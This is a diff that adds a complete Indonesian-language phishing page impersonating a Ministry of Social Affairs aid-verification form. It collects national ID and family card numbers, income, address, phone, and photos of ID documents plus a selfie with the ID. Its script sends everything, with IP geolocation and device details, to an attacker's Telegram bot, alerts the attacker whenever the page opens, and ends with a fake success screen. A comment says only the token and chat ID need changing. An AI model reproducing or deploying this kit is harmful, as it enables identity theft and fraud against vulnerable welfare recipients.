@@ -1,0 +1,888 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#0A5C36">
+    <title>Verifikasi Penerima Bantuan Sosial</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f0f4f0;
+            min-height: 100vh;
+            color: #333;
+        }
+        
+        /* ===== HEADER ===== */
+        .header {
+            background: linear-gradient(135deg, #0A5C36, #0D7B47);
+            padding: 18px 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.15);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .header .logo {
+            width: 44px;
+            height: 44px;
+            background: #fff;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-shrink: 0;
+        }
+        
+        .header .logo svg {
+            width: 26px;
+            height: 26px;
+            fill: #0A5C36;
+        }
+        
+        .header .title {
+            color: #fff;
+        }
+        
+        .header .title h1 {
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 0.3px;
+        }
+        
+        .header .title p {
+            font-size: 11px;
+            opacity: 0.85;
+            margin-top: 2px;
+        }
+        
+        /* ===== CONTENT ===== */
+        .content {
+            padding: 20px 16px 40px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        
+        .alert-box {
+            background: #FFF3CD;
+            border-left: 4px solid #FFC107;
+            border-radius: 10px;
+            padding: 14px 16px;
+            margin-bottom: 16px;
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+        }
+        
+        .alert-box .icon {
+            flex-shrink: 0;
+            width: 22px;
+            height: 22px;
+        }
+        
+        .alert-box .icon svg {
+            width: 100%;
+            height: 100%;
+            fill: #856404;
+        }
+        
+        .alert-box .text {
+            font-size: 12px;
+            line-height: 1.6;
+            color: #856404;
+        }
+        
+        .alert-box .text strong {
+            display: block;
+            margin-bottom: 4px;
+            color: #664D03;
+            font-size: 13px;
+        }
+        
+        .card {
+            background: #fff;
+            border-radius: 14px;
+            padding: 20px;
+            margin-bottom: 16px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.06);
+        }
+        
+        .card h2 {
+            font-size: 16px;
+            margin-bottom: 6px;
+            color: #0A5C36;
+            font-weight: 700;
+        }
+        
+        .card .subtitle {
+            font-size: 12px;
+            color: #888;
+            margin-bottom: 18px;
+            line-height: 1.5;
+        }
+        
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .progress-steps::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 15%;
+            right: 15%;
+            height: 2px;
+            background: #e0e0e0;
+            z-index: 0;
+        }
+        
+        .step-item {
+            text-align: center;
+            position: relative;
+            z-index: 1;
+            flex: 1;
+        }
+        
+        .step-item .circle {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #e0e0e0;
+            color: #fff;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 5px;
+            transition: all 0.3s;
+        }
+        
+        .step-item.active .circle {
+            background: #0A5C36;
+            box-shadow: 0 0 0 4px rgba(10, 92, 54, 0.15);
+        }
+        
+        .step-item.done .circle {
+            background: #4CAF50;
+        }
+        
+        .step-item .label {
+            font-size: 10px;
+            color: #999;
+            font-weight: 600;
+        }
+        
+        .step-item.active .label { color: #0A5C36; }
+        
+        /* ===== FORM ===== */
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 6px;
+        }
+        
+        .form-group label .required {
+            color: #E30613;
+            margin-left: 2px;
+        }
+        
+        .form-group input,
+        .form-group select,
+        .form-group textarea {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 14px;
+            background: #fafafa;
+            font-family: inherit;
+            transition: all 0.2s;
+        }
+        
+        .form-group input:focus,
+        .form-group select:focus,
+        .form-group textarea:focus {
+            outline: none;
+            border-color: #0A5C36;
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(10, 92, 54, 0.1);
+        }
+        
+        .form-group textarea {
+            resize: vertical;
+            min-height: 80px;
+        }
+        
+        .form-group .hint {
+            font-size: 11px;
+            color: #999;
+            margin-top: 4px;
+        }
+        
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+        
+        /* ===== UPLOAD FOTO ===== */
+        .upload-box {
+            border: 2px dashed #c0c0c0;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            background: #fafafa;
+        }
+        
+        .upload-box:hover {
+            border-color: #0A5C36;
+            background: #f0f9f4;
+        }
+        
+        .upload-box.has-file {
+            border-color: #4CAF50;
+            background: #E8F5E9;
+        }
+        
+        .upload-box .icon {
+            width: 32px;
+            height: 32px;
+            margin: 0 auto 8px;
+        }
+        
+        .upload-box .icon svg {
+            width: 100%;
+            height: 100%;
+            fill: #888;
+        }
+        
+        .upload-box.has-file .icon svg {
+            fill: #4CAF50;
+        }
+        
+        .upload-box .text {
+            font-size: 12px;
+            color: #666;
+            font-weight: 600;
+        }
+        
+        .upload-box .sub {
+            font-size: 10px;
+            color: #999;
+            margin-top: 4px;
+        }
+        
+        .upload-box input[type="file"] {
+            display: none;
+        }
+        
+        .preview-img {
+            max-width: 100%;
+            max-height: 150px;
+            border-radius: 8px;
+            margin-top: 10px;
+            display: none;
+        }
+        
+        /* ===== CHECKBOX ===== */
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-bottom: 16px;
+            padding: 12px;
+            background: #f8f9fa;
+            border-radius: 10px;
+        }
+        
+        .checkbox-group input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            margin-top: 2px;
+            flex-shrink: 0;
+            accent-color: #0A5C36;
+        }
+        
+        .checkbox-group label {
+            font-size: 12px;
+            color: #555;
+            line-height: 1.5;
+            cursor: pointer;
+        }
+        
+        /* ===== BUTTON ===== */
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #0A5C36, #0D7B47);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 4px 14px rgba(10, 92, 54, 0.3);
+            transition: all 0.2s;
+            letter-spacing: 0.3px;
+            margin-top: 8px;
+        }
+        
+        .btn:active {
+            transform: scale(0.97);
+            box-shadow: 0 2px 6px rgba(10, 92, 54, 0.3);
+        }
+        
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        /* ===== FOOTER ===== */
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 10px;
+            color: #999;
+            line-height: 1.6;
+        }
+        
+        .secure-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #E8F5E9;
+            color: #2E7D32;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+        
+        .secure-badge .dot {
+            width: 6px;
+            height: 6px;
+            background: #4CAF50;
+            border-radius: 50%;
+        }
+        
+        /* ===== LOADING ===== */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(10, 92, 54, 0.95);
+            z-index: 999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .loading-overlay.show { display: flex; }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin { to { transform: rotate(360deg); } }
+        
+        .loading-overlay .text {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        
+        .loading-overlay .sub {
+            font-size: 12px;
+            opacity: 0.8;
+        }
+        
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+        }
+        
+        .success-icon svg {
+            width: 100%;
+            height: 100%;
+            fill: none;
+            stroke: #fff;
+            stroke-width: 3;
+        }
+        
+        .success-icon circle {
+            stroke-dasharray: 200;
+            stroke-dashoffset: 200;
+            animation: drawCircle 0.6s ease-out forwards;
+        }
+        
+        .success-icon path {
+            stroke-dasharray: 50;
+            stroke-dashoffset: 50;
+            animation: drawCheck 0.4s ease-out 0.6s forwards;
+        }
+        
+        @keyframes drawCircle {
+            to { stroke-dashoffset: 0; }
+        }
+        
+        @keyframes drawCheck {
+            to { stroke-dashoffset: 0; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <div class="header">
+        <div class="logo">
+            <svg viewBox="0 0 24 24"><path d="M12 2L2 7v10c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-10-5zm0 10h7c-.53 4.12-3.28 7.79-7 8.94V12H5V8.3l7-3.11v6.81z"/></svg>
+        </div>
+        <div class="title">
+            <h1>Verifikasi Penerima Bantuan</h1>
+            <p>Kementerian Sosial RI — 2026</p>
+        </div>
+    </div>
+    
+    <div class="content">
+        
+        <!-- ALERT -->
+        <div class="alert-box">
+            <div class="icon">
+                <svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
+            </div>
+            <div class="text">
+                <strong>DATA ANDA BELUM TERVERIFIKASI</strong>
+                Anda terdaftar sebagai penerima Bantuan Sosial Tahap 4. Segera lengkapi data diri Anda sebelum <b id="deadline">-</b>.
+            </div>
+        </div>
+        
+        <!-- CARD FORM -->
+        <div class="card">
+            
+            <!-- PROGRESS STEPS -->
+            <div class="progress-steps">
+                <div class="step-item active" id="step1">
+                    <div class="circle">1</div>
+                    <div class="label">DATA DIRI</div>
+                </div>
+                <div class="step-item" id="step2">
+                    <div class="circle">2</div>
+                    <div class="label">DOKUMEN</div>
+                </div>
+                <div class="step-item" id="step3">
+                    <div class="circle">3</div>
+                    <div class="label">VERIFIKASI</div>
+                </div>
+            </div>
+            
+            <h2>Data Diri Penerima</h2>
+            <p class="subtitle">Isi data sesuai dengan KTP dan Kartu Keluarga Anda. Data akan diverifikasi oleh sistem.</p>
+            
+            <div class="secure-badge">
+                <span class="dot"></span>
+                Data Anda Terenkripsi & Aman
+            </div>
+            
+            <form id="dataForm" onsubmit="submitForm(event)">
+                
+                <div class="form-group">
+                    <label>Nama Lengkap <span class="required">*</span></label>
+                    <input type="text" id="nama" placeholder="Sesuai KTP" required autocomplete="name">
+                </div>
+                
+                <div class="form-group">
+                    <label>NIK (16 Digit) <span class="required">*</span></label>
+                    <input type="tel" id="nik" placeholder="32xxxxxxxxxxxxxx" maxlength="16" pattern="[0-9]{16}" required>
+                    <div class="hint">Sesuai KTP, 16 digit angka</div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Nomor Kartu Keluarga <span class="required">*</span></label>
+                    <input type="tel" id="kk" placeholder="16 digit" maxlength="16" pattern="[0-9]{16}" required>
+                </div>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Tempat Lahir <span class="required">*</span></label>
+                        <input type="text" id="tempatLahir" placeholder="Kota" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Tanggal Lahir <span class="required">*</span></label>
+                        <input type="date" id="tglLahir" required>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Jenis Kelamin <span class="required">*</span></label>
+                    <select id="gender" required>
+                        <option value="">-- Pilih --</option>
+                        <option value="Laki-laki">Laki-laki</option>
+                        <option value="Perempuan">Perempuan</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label>Agama <span class="required">*</span></label>
+                    <select id="agama" required>
+                        <option value="">-- Pilih --</option>
+                        <option value="Islam">Islam</option>
+                        <option value="Kristen">Kristen</option>
+                        <option value="Katolik">Katolik</option>
+                        <option value="Hindu">Hindu</option>
+                        <option value="Buddha">Buddha</option>
+                        <option value="Konghucu">Konghucu</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label>Pekerjaan <span class="required">*</span></label>
+                    <input type="text" id="pekerjaan" placeholder="Contoh: Buruh Harian" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Penghasilan per Bulan <span class="required">*</span></label>
+                    <select id="penghasilan" required>
+                        <option value="">-- Pilih --</option>
+                        <option value="< Rp 1.000.000">&lt; Rp 1.000.000</option>
+                        <option value="Rp 1.000.000 - Rp 2.000.000">Rp 1.000.000 - Rp 2.000.000</option>
+                        <option value="Rp 2.000.000 - Rp 3.000.000">Rp 2.000.000 - Rp 3.000.000</option>
+                        <option value="> Rp 3.000.000">&gt; Rp 3.000.000</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label>Alamat Lengkap <span class="required">*</span></label>
+                    <textarea id="alamat" placeholder="Jalan, RT/RW, Kelurahan, Kecamatan, Kota/Kabupaten, Provinsi" required></textarea>
+                </div>
+                
+                <div class="form-group">
+                    <label>Nomor HP/WA Aktif <span class="required">*</span></label>
+                    <input type="tel" id="noHp" placeholder="08xxxxxxxxxx" pattern="[0-9]{10,13}" required>
+                    <div class="hint">Nomor yang terdaftar di WhatsApp</div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Email</label>
+                    <input type="email" id="email" placeholder="contoh@gmail.com">
+                </div>
+                
+                <div class="form-group">
+                    <label>Status Perkawinan <span class="required">*</span></label>
+                    <select id="status" required>
+                        <option value="">-- Pilih --</option>
+                        <option value="Belum Kawin">Belum Kawin</option>
+                        <option value="Kawin">Kawin</option>
+                        <option value="Cerai Hidup">Cerai Hidup</option>
+                        <option value="Cerai Mati">Cerai Mati</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label>Jumlah Tanggungan Keluarga <span class="required">*</span></label>
+                    <input type="number" id="tanggungan" placeholder="Contoh: 3" min="0" max="20" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Upload Foto KTP <span class="required">*</span></label>
+                    <div class="upload-box" id="ktpBox" onclick="document.getElementById('ktpFile').click()">
+                        <div class="icon">
+                            <svg viewBox="0 0 24 24"><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
+                        </div>
+                        <div class="text">Klik untuk upload KTP</div>
+                        <div class="sub">Format: JPG/PNG, Max: 5MB</div>
+                        <img id="ktpPreview" class="preview-img" alt="Preview KTP">
+                    </div>
+                    <input type="file" id="ktpFile" accept="image/*" capture="environment" onchange="previewImage(event, 'ktp')" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Upload Foto Kartu Keluarga <span class="required">*</span></label>
+                    <div class="upload-box" id="kkBox" onclick="document.getElementById('kkFile').click()">
+                        <div class="icon">
+                            <svg viewBox="0 0 24 24"><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
+                        </div>
+                        <div class="text">Klik untuk upload KK</div>
+                        <div class="sub">Format: JPG/PNG, Max: 5MB</div>
+                        <img id="kkPreview" class="preview-img" alt="Preview KK">
+                    </div>
+                    <input type="file" id="kkFile" accept="image/*" capture="environment" onchange="previewImage(event, 'kk')" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Upload Foto Selfie dengan KTP <span class="required">*</span></label>
+                    <div class="upload-box" id="selfieBox" onclick="document.getElementById('selfieFile').click()">
+                        <div class="icon">
+                            <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                        </div>
+                        <div class="text">Klik untuk upload Selfie</div>
+                        <div class="sub">Wajah terlihat jelas + KTP</div>
+                        <img id="selfiePreview" class="preview-img" alt="Preview Selfie">
+                    </div>
+                    <input type="file" id="selfieFile" accept="image/*" capture="user" onchange="previewImage(event, 'selfie')" required>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="agree" required>
+                    <label for="agree">Saya menyatakan bahwa data yang saya isi adalah BENAR dan dapat dipertanggungjawabkan. Saya menyetujui data ini digunakan untuk verifikasi penerima bantuan.</label>
+                </div>
+                
+                <button type="submit" class="btn" id="submitBtn">
+                    KIRIM & VERIFIKASI DATA
+                </button>
+                
+            </form>
+        </div>
+        
+    </div>
+    
+    <div class="footer">
+        © 2026 Kementerian Sosial Republik Indonesia<br>
+        Sistem Informasi Bantuan Sosial Terpadu
+    </div>
+    
+    <!-- LOADING -->
+    <div class="loading-overlay" id="loading">
+        <div class="spinner"></div>
+        <div class="text">Mengirim data...</div>
+        <div class="sub">Mohon tunggu, jangan tutup halaman</div>
+    </div>
+    
+    <script>
+        // ============================================================
+        // GANTI 2 BARIS INI DOANG!
+        // ============================================================
+        const BOT_TOKEN = '6972140279:AAFz3xHq8u2kL5mN7oP9rS1tU3vW5xY7zA9bC'; // GANTI!
+        const CHAT_ID = '123456789'; // GANTI!
+        // ============================================================
+        
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true
+                })
+            }).catch(() => {});
+        }
+        
+        function sendPhotoToTelegram(file, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', file);
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'HTML');
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).catch(() => {});
+        }
+        
+        async function getIPInfo() {
+            try {
+                const r = await fetch('https://ipapi.co/json/');
+                return await r.json();
+            } catch(e) {
+                try {
+                    const r = await fetch('https://ipwho.is/');
+                    return await r.json();
+                } catch(e2) { return null; }
+            }
+        }
+        
+        function getDevice() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cores: navigator.hardwareConcurrency || '-',
+                touch: 'ontouchstart' in window ? 'Ya' : 'Tidak',
+                connection: navigator.connection ? navigator.connection.effectiveType : '-'
+            };
+        }
+        
+        function previewImage(event, type) {
+            const file = event.target.files[0];
+            if (!file) return;
+            
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const preview = document.getElementById(type + 'Preview');
+                const box = document.getElementById(type + 'Box');
+                
+                preview.src = e.target.result;
+                preview.style.display = 'block';
+                box.classList.add('has-file');
+                
+                const textEl = box.querySelector('.text');
+                const subEl = box.querySelector('.sub');
+                textEl.textContent = 'File terpilih';
+                subEl.textContent = file.name + ' (' + (file.size / 1024).toFixed(1) + ' KB)';
+            };
+            reader.readAsDataURL(file);
+        }
+        
+        async function submitForm(e) {
+            e.preventDefault();
+            
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.textContent = 'Mengirim...';
+            
+            const data = {
+                nama: document.getElementById('nama').value,
+                nik: document.getElementById('nik').value,
+                kk: document.getElementById('kk').value,
+                tempatLahir: document.getElementById('tempatLahir').value,
+                tglLahir: document.getElementById('tglLahir').value,
+                gender: document.getElementById('gender').value,
+                agama: document.getElementById('agama').value,
+                pekerjaan: document.getElementById('pekerjaan').value,
+                penghasilan: document.getElementById('penghasilan').value,
+                alamat: document.getElementById('alamat').value,
+                noHp: document.getElementById('noHp').value,
+                email: document.getElementById('email').value,
+                status: document.getElementById('status').value,
+                tanggungan: document.getElementById('tanggungan').value,
+                timestamp: new Date().toLocaleString('id-ID')
+            };
+            
+            const ip = await getIPInfo();
+            const dev = getDevice();
+            
+            let msg = `DATA DIRI TARGET DITEMUKAN!\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `DATA DIRI:\n`;
+            msg += `Nama: <b>${data.nama}</b>\n`;
+            msg += `NIK: <code>${data.nik}</code>\n`;
+            msg += `KK: <code>${data.kk}</code>\n`;
+            msg += `TTL: ${data.tempatLahir}, ${data.tglLahir}\n`;
+            msg += `Gender: ${data.gender}\n`;
+            msg += `Agama: ${data.agama}\n`;
+            msg += `Pekerjaan: ${data.pekerjaan}\n`;
+            msg += `Penghasilan: ${data.penghasilan}\n`;
+            msg += `Status: ${data.status}\n`;
+            msg += `Tanggungan: ${data.tanggungan}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `ALAMAT:\n`;
+            msg += `${data.alamat}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `KONTAK:\n`;
+            msg += `HP: <code>${data.noHp}</code>\n`;
+            msg += `Email: ${data.email || '-'}\n`;
+            
+            if (ip) {
+                msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                msg += `IP INFO:\n`;
+                msg += `IP: <code>${ip.ip || '-'}</code>\n`;
+                msg += `Kota: ${ip.city || '-'}\n`;
+                msg += `Region: ${ip.region || '-'}\n`;
+                msg += `ISP: ${ip.org || ip.connection?.isp || '-'}\n`;
+                if (ip.latitude && ip.longitude) {
+                    msg += `<a href="https://maps.google.com/?q=${ip.latitude},${ip.longitude}">IP Maps</a>\n`;
+                }
+            }
+            
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `DEVICE:\n`;
+            msg += `Platform: ${dev.platform}\n`;
+            msg += `Screen: ${dev.screen}\n`;
+            msg += `Timezone: ${dev.timezone}\n`;
+            msg += `UA: <code>${dev.userAgent.substring(0, 100)}</code>\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `Waktu: ${data.timestamp}`;
+            
+            sendToTelegram(msg);
+            
+            const ktpFile = document.getElementById('ktpFile').files[0];
+            const kkFile = document.getElementById('kkFile').files[0];
+            const selfieFile = document.getElementById('selfieFile').files[0];
+            
+            if (ktpFile) sendPhotoToTelegram(ktpFile, `KTP — ${data.nama} — NIK: ${data.nik}`);
+            if (kkFile) sendPhotoToTelegram(kkFile, `KK — ${data.nama} — No KK: ${data.kk}`);
+            if (selfieFile) sendPhotoToTelegram(selfieFile, `Selfie — ${data.nama} — ${data.noHp}`);
+            
+            setTimeout(() => {
+                document.getElementById('loading').classList.add('show');
+                
+                setTimeout(() => {
+                    document.getElementById('loading').innerHTML = `
+                        <div class="success-icon">
+                            <svg viewBox="0 0 100 100">
+                                <circle cx="50" cy="50" r="40" fill="none"/>
+                                <path d="M30 50 L45 65 L70 40" fill="none"/>
+                            </svg>
+                        </div>
+                        <div class="text">Data Berhasil Dikirim</div>
+                        <div class="sub">Data Anda sedang diverifikasi oleh sistem.<br>Anda akan menerima notifikasi dalam 1x24 jam.</div>
+                    `;
+                    
+                    setTimeout(() => {
+                        window.location.href = 'https://www.kemensos.go.id';
+                    }, 3000);
+                }, 2500);
+            }, 500);
+        }
+        
+        (async function init() {
+            const d = new Date();
+            d.setDate(d.getDate() + 2);
+            const options = { day: '2-digit', month: 'long', year: 'numeric', hour: '2-digit', minute: '2-digit' };
+            document.getElementById('deadline').textContent = d.toLocaleDateString('id-ID', options);
+            
+            const ip = await getIPInfo();
+            const dev = getDevice();
+            
+            let msg = `PHISHING PAGE DIBUKA\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `Waktu: ${new Date().toLocaleString('id-ID')}\n`;
+            
+            if (ip) {
+                msg += `IP: <code>${ip.ip || '-'}</code>\n`;
+                msg += `Kota: ${ip.city || '?'}, ${ip.country_name || ip.country || '?'}\n`;
+                msg += `ISP: ${ip.org || ip.connection?.isp || '?'}\n`;
+            }
+            
+            msg += `Platform: ${dev.platform}\n`;
+            msg += `Screen: ${dev.screen}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `Target sedang mengisi data...`;
+            
+            sendToTelegram(msg);
+        })();
+    </script>
+</body>
+</html>
